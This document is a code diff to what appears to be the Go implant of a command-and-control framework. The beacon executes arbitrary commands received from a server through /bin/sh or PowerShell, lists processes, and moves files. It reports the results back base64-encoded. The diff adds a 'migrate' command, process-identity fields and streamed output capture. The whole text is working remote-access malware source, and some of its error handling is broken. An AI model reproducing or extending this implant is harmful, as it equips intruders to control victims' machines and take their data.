@@ -4,6 +4,8 @@ import (
 	"os"
 	"io"
 	"fmt"
+	"time"
+	"bufio"
 	"bytes"
 	"strconv"
 	"os/exec"
@@ -17,7 +19,7 @@ import (
 )
 
 func (packet BeaconHttp) exitHandler() {
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"quit",[]byte("quit")})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"quit",[]byte("quit")})
 	debugFatal(err)
 	encoded := b64.StdEncoding.EncodeToString(data)
 	queryCommandHttp(encoded)
@@ -101,12 +103,16 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for _, cmd := range commResp.Exec {
 		cmdSplit := strings.Fields(cmd);
 		output := []byte{}
-		fmt.Println(cmdSplit[0] == "quit")
 		
+		if cmdSplit[0] == "migrate" {
+			time.Sleep(10 * time.Second)
+			packet.exitHandler()
+		}
+
 		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
 			packet.exitHandler()
 		}
-		fmt.Println(cmdSplit)
+
 		if cmdSplit[0] == "plist" {
 			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
 			procList, _ := ps.Processes()
@@ -115,23 +121,54 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
 			}
 
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"plist",[]byte(procs)})
+			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
 			return
 		}
 		
+		var cmdHandle *exec.Cmd
+
 		if runtime.GOOS == "linux" {
 			command := []string{ "-c", cmd }
-			output, _ = exec.Command("/bin/sh", command...).Output()
+			cmdHandle = exec.Command("/bin/sh", command...)
 		} else if runtime.GOOS == "windows" {
-			command := []string { "/c", cmd }
-			output, _ = exec.Command("cmd", command...).Output()
+			command := []string { "-c", cmd }
+			cmdHandle = exec.Command("powershell", command...)
 		}
 
+		stderr, err := cmdHandle.StderrPipe()
+		stdout, err := cmdHandle.StdoutPipe()
+		
+		if err = cmdHandle.Start(); err == nil {
+			scanner := bufio.NewScanner(stderr)
+			
+			if err != nil {
+				output = append(output, scanner.Text()...)
+				output = append(output, '\n')
+			}
+
+			for scanner.Scan() {
+				output = append(output, scanner.Text()...)
+				output = append(output, '\n')
+			}
+
+			scanner = bufio.NewScanner(stdout)
+			
+			if err != nil {
+				output = append(output, scanner.Text()...)
+				output = append(output, '\n')
+			}
+
+			for scanner.Scan() {
+				output = append(output, scanner.Text()...)
+				output = append(output, '\n')
+			}
+		}
+		
 		if len(output) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"exec",output})
+			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
@@ -182,7 +219,7 @@ func (packet BeaconHttp) download(filePath string) {
 
 	result += ";" + targetDir + "/" + filename
 
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"upload", []byte(result)})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(result)})
 	debugFatal(err)
 	
 	if err != nil {
@@ -194,7 +231,7 @@ func (packet BeaconHttp) download(filePath string) {
 }
 
 func (packet BeaconHttp) upload(filename string) {
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"upload", []byte(filename)})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(filename)})
 	debugFatal(err)
 	
 	if err != nil {
